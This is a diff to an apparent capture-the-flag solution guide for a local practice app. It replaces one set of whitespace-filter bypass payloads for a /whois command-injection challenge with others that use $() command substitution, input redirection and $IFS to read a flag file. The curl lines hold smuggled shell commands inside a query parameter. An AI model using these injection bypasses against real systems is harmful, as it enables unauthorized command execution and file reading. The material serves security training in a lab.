@@ -72,17 +72,16 @@ CHALLENGE 5: Space Bypass — Brace Expansion
 Flag: FLAG{cmd1_sp4c3_byp4ss}
 
   The /whois endpoint blocks whitespace characters via regex (\s).
-  Bypass with brace expansion or $IFS:
+  NOTE: \s also matches newlines (%0a), tabs, etc. — so newline-based
+  approaches may not work depending on the regex flags.
 
-  # Brace expansion (no spaces needed):
-  curl "http://localhost:5011/whois?domain=example.com%0a{cat,/app/flag5.txt}"
+  Best approach — input redirection (no spaces or whitespace needed):
+  curl 'http://localhost:5011/whois?domain=$(cat</app/flag5.txt)'
 
-  # $IFS as space replacement:
-  curl "http://localhost:5011/whois?domain=example.com%0acat\$IFS/app/flag5.txt"
+  This uses $() command substitution with < input redirection.
+  No spaces or whitespace characters appear in the payload.
 
-  # Tab character (may not be caught by \s in all regex modes):
-  curl "http://localhost:5011/whois?domain=example.com%0acat%09/app/flag5.txt"
-
-  Note: %0a is URL-encoded newline to start a new command line.
+  Alternative — if $() with < doesn't work, try:
+  curl "http://localhost:5011/whois?domain=\$(cat\$IFS/app/flag5.txt)"
 
 ===============================================================================
